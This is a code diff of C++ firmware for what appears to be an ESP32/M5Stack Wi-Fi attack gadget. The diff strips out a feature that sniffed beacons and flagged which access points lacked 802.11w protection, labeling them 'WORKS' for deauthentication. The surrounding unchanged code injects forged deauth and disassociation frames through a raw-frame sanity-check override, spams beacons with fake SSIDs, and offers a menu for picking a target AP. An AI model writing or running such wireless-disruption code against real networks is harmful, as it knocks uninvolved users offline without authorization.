@@ -22,16 +22,12 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32
 // ---- Scan storage ---------------------------------------------------------
 #define MAX_NET 32
 
-// pmf: deauth-vulnerability from the AP's PMF (802.11w) state.
-enum { PMF_UNKNOWN = 0, PMF_NONE = 1, PMF_OPTIONAL = 2, PMF_REQUIRED = 3 };
-
 struct NetInfo {
     char    ssid[33];
     uint8_t bssid[6];
     int32_t rssi;
     uint8_t ch;
     bool    open;
-    uint8_t pmf;        // PMF_* : NONE=deauth works, REQUIRED=protected
 };
 
 static NetInfo g_nets[MAX_NET];
@@ -41,7 +37,6 @@ static int     g_netCount = 0;
 // no byte-level truncation, which would cut multibyte UTF-8 / Cyrillic mid-char).
 static const char *g_linePtr[MAX_NET];
 static uint8_t     g_bars[MAX_NET];     // per-network signal level (0..4) for the icon
-static uint16_t    g_colors[MAX_NET];   // per-network text color by deauth-vulnerability
 
 static uint8_t rssi_bars(int32_t rssi) {
     if (rssi >= -55) return 4;
@@ -49,24 +44,6 @@ static uint8_t rssi_bars(int32_t rssi) {
     if (rssi >= -72) return 2;
     if (rssi >= -80) return 1;
     return 0;
-}
-
-// Deauth-vulnerability -> row color / word.
-static uint16_t pmf_color(uint8_t pmf) {
-    switch (pmf) {
-        case PMF_NONE:     return COL_ACCENT;   // green: deauth works
-        case PMF_OPTIONAL: return COL_WARN;     // orange: PMF optional
-        case PMF_REQUIRED: return COL_DIM;      // gray: protected
-        default:           return COL_FG;       // white: unknown
-    }
-}
-static const char *pmf_word(uint8_t pmf) {
-    switch (pmf) {
-        case PMF_NONE:     return "WORKS";
-        case PMF_OPTIONAL: return "opt-PMF";
-        case PMF_REQUIRED: return "PROTECTED";
-        default:           return "?";
-    }
 }
 
 // ---- Frame templates ------------------------------------------------------
@@ -120,49 +97,6 @@ static void kick(const uint8_t *dst, const uint8_t *src, const uint8_t *bssid) {
     ri = (ri + 1) & 3;
     f[0] = 0xC0; esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);   // deauth
     f[0] = 0xA0; esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);   // disassoc
-}
-
-// ---- PMF (deauth-vulnerability) detection ----------------------------------
-// Sniff each AP's beacon, parse its RSN Information Element and read the RSN
-// Capabilities MFPR/MFPC bits: MFPR=1 -> PMF required (deauth blocked), MFPC-only
-// -> optional, no RSN/MFP -> deauth works. Sets NetInfo.pmf.
-static int find_ap(const uint8_t *bssid) {
-    for (int i = 0; i < g_netCount; i++)
-        if (memcmp(g_nets[i].bssid, bssid, 6) == 0) return i;
-    return -1;
-}
-
-static void pmf_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
-    const wifi_promiscuous_pkt_t *p = (const wifi_promiscuous_pkt_t *)buf;
-    const uint8_t *fr = p->payload;
-    uint8_t sub = fr[0] & 0xF0;                    // subtype: beacon 0x80, probe-resp 0x50
-    if (sub != 0x80 && sub != 0x50) return;
-    int idx = find_ap(fr + 16);                    // addr3 = BSSID
-    if (idx < 0 || g_nets[idx].pmf != PMF_UNKNOWN) return;
-
-    int total = p->rx_ctrl.sig_len;
-    const uint8_t *end = fr + total - 4;           // minus FCS
-    const uint8_t *ie = fr + 36;                   // skip 24B header + 12B fixed params
-    uint8_t pmf = PMF_NONE;                         // no RSN found => no PMF
-    while (ie + 2 <= end) {
-        uint8_t tag = ie[0], l = ie[1];
-        if (ie + 2 + l > end) break;
-        if (tag == 48 && l >= 8) {                 // RSN IE
-            const uint8_t *r = ie + 2, *re = ie + 2 + l;
-            r += 2 + 4;                            // version + group cipher
-            if (r + 2 > re) break;
-            uint16_t pc = r[0] | (r[1] << 8); r += 2 + 4 * pc;     // pairwise
-            if (r + 2 > re) break;
-            uint16_t ac = r[0] | (r[1] << 8); r += 2 + 4 * ac;     // AKM
-            if (r + 2 <= re) {
-                uint8_t caps = r[0];
-                pmf = (caps & 0x40) ? PMF_REQUIRED : (caps & 0x80) ? PMF_OPTIONAL : PMF_NONE;
-            }
-            break;
-        }
-        ie += 2 + l;
-    }
-    g_nets[idx].pmf = pmf;
 }
 
 // Funny SSID list for beacon spam.
@@ -281,43 +215,10 @@ static void do_scan() {
         memcpy(e.bssid, WiFi.BSSID(i), 6);
         e.rssi = WiFi.RSSI(i);
         e.ch   = (uint8_t)WiFi.channel(i);
-        wifi_auth_mode_t am = WiFi.encryptionType(i);
-        e.open = (am == WIFI_AUTH_OPEN);
-        // Seed PMF from auth mode; WPA2 needs the RSN sniff below to be sure.
-        if (am == WIFI_AUTH_OPEN || am == WIFI_AUTH_WEP || am == WIFI_AUTH_WPA_PSK)
-            e.pmf = PMF_NONE;
-        else if (am == WIFI_AUTH_WPA3_PSK)
-            e.pmf = PMF_REQUIRED;
-        else if (am == WIFI_AUTH_WPA2_WPA3_PSK)
-            e.pmf = PMF_OPTIONAL;
-        else
-            e.pmf = PMF_UNKNOWN;                      // WPA2 & co -> confirm via RSN
+        e.open = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN);
         g_netCount++;
     }
     WiFi.scanDelete();
-
-    // Refine PMF: sniff beacons on the channels that still have unknowns and
-    // read the RSN Capabilities MFPR/MFPC bits.
-    bool visit[14] = {false};
-    bool any = false;
-    for (int i = 0; i < g_netCount; i++)
-        if (g_nets[i].pmf == PMF_UNKNOWN && g_nets[i].ch >= 1 && g_nets[i].ch <= 13) {
-            visit[g_nets[i].ch] = true; any = true;
-        }
-    if (any) {
-        ui_message("WiFi Scan", "Checking PMF...", "deauth vuln");
-        wifi_promiscuous_filter_t filt;
-        filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
-        esp_wifi_set_promiscuous_filter(&filt);
-        esp_wifi_set_promiscuous_rx_cb(&pmf_cb);
-        esp_wifi_set_promiscuous(true);
-        for (int ch = 1; ch <= 13; ch++) {
-            if (!visit[ch]) continue;
-            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
-            delay(300);                              // dwell: pmf_cb fills RSN caps
-        }
-        esp_wifi_set_promiscuous(false);
-    }
     WiFi.mode(WIFI_OFF);
 }
 
@@ -368,17 +269,9 @@ static void run_deauth_ap(const NetInfo &ap) {
 
 // Detail + action screen for one scanned network.
 static void net_detail(const NetInfo &e) {
-    char l2[40];
-    snprintf(l2, sizeof(l2), "ch%d  %lddB   M5=deauth  hold=back",
-             e.ch, (long)e.rssi);
-    ui_message(e.ssid, "", l2);
-    // Colored deauth verdict on the big line.
-    M5.Display.setFont(&fonts::efontJA_16);
-    M5.Display.setTextSize(1);
-    M5.Display.setTextColor(pmf_color(e.pmf), COL_BG);
-    M5.Display.setCursor(8, 52);
-    M5.Display.printf("deauth: %s", pmf_word(e.pmf));
-
+    char l1[24];
+    snprintf(l1, sizeof(l1), "ch%d  %lddB  %s", e.ch, (long)e.rssi, e.open ? "open" : "enc");
+    ui_message(e.ssid, l1, "front=DEAUTH   hold=back");
     board_update();
     while (true) {
         board_update();
@@ -397,14 +290,12 @@ static void screen_scan() {
     }
 
     while (true) {
-        // SSID + signal icon; row color flags deauth-vulnerability (green=works,
-        // gray=PMF-protected). Channel/RSSI/BSSID appear on the AP detail.
+        // Show SSID + signal icon; channel/RSSI/BSSID appear on the AP detail.
         for (int i = 0; i < g_netCount; i++) {
             g_linePtr[i] = g_nets[i].ssid;
             g_bars[i]    = rssi_bars(g_nets[i].rssi);
-            g_colors[i]  = pmf_color(g_nets[i].pmf);
         }
-        int c = ui_menu("Networks", g_linePtr, g_netCount, 0, g_bars, g_colors);
+        int c = ui_menu("Networks", g_linePtr, g_netCount, 0, g_bars);
         if (c < 0) return;
         net_detail(g_nets[c]);
     }
@@ -570,9 +461,8 @@ static void pick_target_and(void (*action)(const NetInfo &)) {
         for (int i = 0; i < g_netCount; i++) {
             g_linePtr[i] = g_nets[i].ssid;
             g_bars[i]    = rssi_bars(g_nets[i].rssi);
-            g_colors[i]  = pmf_color(g_nets[i].pmf);   // green=deauth works, gray=PMF
         }
-        int c = ui_menu("Pick AP", g_linePtr, g_netCount, 0, g_bars, g_colors);
+        int c = ui_menu("Pick AP", g_linePtr, g_netCount, 0, g_bars);
         if (c < 0) return;
         action(g_nets[c]);
     }
